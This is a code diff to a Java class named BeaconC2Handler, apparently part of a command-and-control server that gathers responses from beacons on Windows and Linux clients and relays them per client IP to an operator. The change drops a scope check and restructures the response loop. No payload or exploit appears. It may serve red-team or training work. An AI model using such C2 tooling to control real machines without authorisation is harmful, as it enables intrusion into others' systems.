@@ -127,23 +127,24 @@ public class BeaconC2Handler implements Runnable{
                     // If a message is a request, it will be in the format "Request [Scope - Windows, Linux, or IPv4 Address]_"
                     else if(verb.equals("Request")){
                         StringBuilder responseToRequest = new StringBuilder();
-                        if(scope.equals("ClientData")){
-                            HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
-                            for (String IP : clientResponses.keySet()) {
-                                responseToRequest.append("Client IP: ").append(IP).append("\n");
-                                responseToRequest.append("Responses:\n");
+                        HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
+                        for (String IP : clientResponses.keySet()) {
+                            responseToRequest.append("Client IP: ").append(IP).append("\n");
+                            responseToRequest.append("Responses:\n");
 
-                                ArrayList<String> responses = clientResponses.get(IP);
-                                for (int i = 0; i < responses.size(); i++) {
-                                    String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
-                                    
-                                    // Only add if the line is not empty
-                                    if (!line.isEmpty()) {
-                                        responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
-                                    }
+                            ArrayList<String> responses = clientResponses.get(IP);
+                            for (int i = 0; i < responses.size(); i++) {
+                                String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
+                                
+                                // Only add if the line is not empty
+                                if (!line.isEmpty()) {
+                                    responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
                                 }
-                                responseToRequest.append("\n"); // Separate each client's response block with a newline
                             }
+                            responseToRequest.append("\n"); // Separate each client's response block with a newline
+                        }
+                        C2Server.send(responseToRequest.toString());
+                        //if(scope.equals("ClientData")){
                             // if(target.equals("Windows")){
                             //     if(tokens[3].equals("All")){
                             //         HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getClientResponses("Windows");
@@ -195,9 +196,8 @@ public class BeaconC2Handler implements Runnable{
                             //         responseToRequest.append("\n"); // Separate each client's response block with a newline
                             //     }
                             // }
-                            // Send the final response
-                            C2Server.send(responseToRequest.toString());    
-                        }
+                            // Send the final response    
+                        //}
                     }
                     // Request Client Status
                     else if(verb.equals("Status")){
